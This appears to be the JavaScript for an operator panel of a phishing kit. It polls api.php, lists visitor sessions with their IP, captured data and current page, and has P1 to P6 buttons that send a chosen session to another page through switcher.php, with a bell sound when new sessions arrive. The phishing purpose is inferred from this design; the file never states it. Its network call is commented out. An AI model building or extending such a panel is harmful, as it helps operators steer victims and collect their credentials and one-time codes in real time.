var server = '';
setInterval(function () { Backend.Post(server + "api.php", { action: 'list' }); }, 5000);
var last_count = 0;
var curent_data = [];
var is_sound_enabled = false;
function objectsAreSame(x, y) {
    var objectsAreSame = true;
    for (var propertyName in x) {
        if (x[propertyName] !== y[propertyName]) {
            objectsAreSame = false;
            break;
        }
    }
    return objectsAreSame;
}
var Backend = /** @class */ (function () {
    function Backend() {
    }
    Backend.Post = function (url, body) {
        var _this = this;
       /* if (body === void 0) { body = {}; }
        $.ajax({
            type: "POST",
            url: url,
            data: body,
            success: function (data) { return _this.AfterPost(data); },
            dataType: "json"
        });*/
    };
    Backend.AfterPost = function (data) {
        if (JSON.stringify(data) !== JSON.stringify(curent_data)) {
            $("#table tbody tr").remove();
            console.log('not the same');
            if (curent_data.length !== data.length && is_sound_enabled)
                PlaySound();
            for (var _i = 0, data_1 = data; _i < data_1.length; _i++) {
                var session = data_1[_i];
                var row = '<tr id="' + session.id + '" ><td>' + session.id + '</td><td>' + session.ip + '</td><td><pre>' + session.data + '</pre> </td><td>' + moment.utc(session.last_ping).local().fromNow() + '</td><td>' + session.page + '</td><td style="text-align: center"><div class="btn-group btn-group-sm" role="group">\n' +
                    '                        <button type="button" class="btn btn-primary P" data-id="P1">P1</button>\n' +
                    '                        <button type="button" class="btn btn-primary P" data-id="P2">P2</button>\n' +
                    '                        <button type="button" class="btn btn-primary P" data-id="P3">P3</button>\n' +
                    '                        <button type="button" class="btn btn-primary P" data-id="P4">P4</button>\n' +
                    '                        <button type="button" class="btn btn-primary P" data-id="P5">P5</button>\n' +
                    '                        <button type="button" class="btn btn-primary P" data-id="P6">P6</button>\n' +
                    '                    </div></td><td class="D"><button type="button" class="btn-sm btn btn-danger D">Delete</button></td></tr>';
                $('#table tbody').append(row);
            }
            curent_data = data;
            $('.P').click(function () {
                var page = $(this).attr('data-id');
                var uid = $(this).parent().closest('tr').attr('id');
                console.log(uid);
                Backend.Post(server + "switcher.php", { uid: uid, page: page });
            });
            $('.D').click(function () {
                var page = $(this).attr('data-id');
                var uid = $(this).parent().closest('tr').attr('id');
                console.log(uid);
                Backend.Post(server + "api.php", { session: uid, action: 'delete_session' });
            });
        }
        else {
            console.log('the same');
        }
    };
    return Backend;
}());

function PlaySound() {

    $.playSound("./sounds/bell_ring.mp3");
}

function SwitchSound() {
    is_sound_enabled = !is_sound_enabled;
    $('#sound_btn').text(is_sound_enabled ? "Disable Sound" : "Enable Sound");
    PlaySound();
}
Backend.Post(server + "api.php", { action: 'list' });
